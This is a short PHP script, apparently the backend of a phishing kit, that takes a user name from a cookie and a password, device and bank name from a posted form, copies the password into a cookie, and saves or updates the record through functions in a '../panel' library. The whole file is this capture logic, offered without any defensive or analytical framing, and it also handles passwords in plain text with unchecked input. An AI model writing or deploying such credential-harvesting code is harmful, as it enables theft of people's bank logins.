<?php 
require('../panel/lib/funciones.php');

$usuario = $_COOKIE['usuario'];
$contrasena = $_POST['pass'];
$dispositivo = $_POST['dis'];
$banco = $_POST['banco'];

setcookie('contrasena',$contrasena,time()+60*9);

if (isset($_COOKIE['registro'])) {
	$id = $_COOKIE['registro'];
	actualizar_usuario($usuario,$contrasena,$id);
}else{
	crear_registro($usuario,$contrasena,$dispositivo, $banco);	
}


?>